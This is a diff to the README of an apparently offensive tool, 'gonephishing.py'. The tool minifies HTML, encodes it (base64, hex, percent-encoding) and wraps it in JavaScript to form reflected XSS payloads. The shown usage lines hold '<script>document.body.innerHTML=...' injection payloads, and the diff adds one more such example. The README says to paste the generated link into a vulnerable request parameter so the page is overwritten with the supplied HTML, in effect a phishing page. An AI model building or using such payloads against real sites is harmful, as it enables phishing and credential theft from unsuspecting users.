@@ -17,7 +17,7 @@ pip3 install htmlmin
 
  Generate a minified version of an html file and optionally encode it then inject it into some javascript/html.  
  
- the string that you inject into (the javascript that injects the html file) must contain a $-$ field to mark location to inject html into.  
+ the containing javascript must contain a $-$ field to mark location to inject html into.  
  
  Current supported encoders are b64 (base64), hex ('\xAA\xBB' etc), pcnt (every character as url encoded).  If pcnt encoding isnt selected the string gets a standard urlencode
  
@@ -30,7 +30,9 @@ python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.bod
 
 python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=("$-$")</script>'  --encoders --encoders hex
 
-python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("$-$")</script>'  --encoders --encoders b64,hex 
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("$-$")</script>'  --encoders --encoders b64,hex
+
+python3 ./gonephishing.py --xss --html "@./test.html" --js '<script>document.body.innerHTML=atob("$-$")</script>'  --encoders --encoders pcnt
 ~~~
 Paste the generated link into the vulnerable request parameter and the page should be overwritten with the supplied html.
 
